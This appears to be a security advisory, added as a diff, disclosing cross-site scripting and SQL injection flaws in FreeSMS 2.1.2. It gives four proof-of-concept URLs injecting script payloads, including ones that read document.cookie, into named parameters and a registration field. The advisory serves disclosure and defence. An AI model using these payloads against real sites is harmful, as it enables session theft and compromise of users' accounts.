@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/63004/info
+ 
+FreeSMS is prone to multiple cross-site scripting vulnerabilities and an SQL-injection vulnerability because it fails to properly sanitize user-supplied input.
+ 
+Attackers can exploit these issues to execute arbitrary code in the context of the browser, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database; other attacks are also possible.
+ 
+FreeSMS 2.1.2 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/freesms/pages/crc_handler.php?method=profile&func=%3Cscript%3Ealert%28123%29%3C/script%3E
+http://www.example.com/FreeSMS/pages/crc_evaluation.php?crc=diggks5j3mlf6pee6knk34qq60&uid=3&course='"</script><script>alert(document.cookie)</script>
+http://www.example.com/FreeSMS/pages/crc_login.php?crc=diggks5j3mlf6pee6knk34qq60&uid='"</script><script>alert(document.cookie)</script>
+http://www.example.com/FreeSMS/pages/crc_handler.php?method=register&func=add -> Username -> '"</script><script>alert(document.cookie)</script> 
